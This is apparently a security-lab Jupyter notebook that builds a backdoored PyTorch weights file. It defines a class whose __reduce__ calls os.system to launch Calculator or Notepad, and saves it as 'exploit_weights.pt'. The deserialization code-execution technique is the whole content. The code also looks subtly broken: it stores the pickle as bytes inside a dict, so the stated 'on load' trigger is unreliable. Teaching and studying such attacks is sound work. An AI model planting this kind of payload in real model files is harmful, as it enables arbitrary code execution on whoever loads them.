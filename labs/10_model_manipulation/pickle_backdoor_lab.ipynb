{
 "cells": [
  { "cell_type": "markdown", "source": [
   "# Pickle Backdoor Lab\n",
   "Generate a malicious PyTorch `.pt` file that pops Calculator / Notepad on load."
  ]},
  { "cell_type": "code", "source": [
   "!pip install torch --quiet\n",
   "import os, io, pickle, torch\n",
   "class RCE:\n",
   "    def __reduce__(self):\n",
   "        cmd = 'open -a Calculator' if os.name=='posix' else 'notepad'\n",
   "        return (os.system, (cmd,))\n",
   "payload = RCE()\n",
   "buf = io.BytesIO(); pickle.dump(payload, buf)\n",
   "torch.save({'model': buf.getvalue()}, 'exploit_weights.pt')\n",
   "print('Malicious weights created!')"
  ]}
 ],
 "metadata": { "kernelspec": { "name": "python3" } },
 "nbformat": 4,
 "nbformat_minor": 5
}
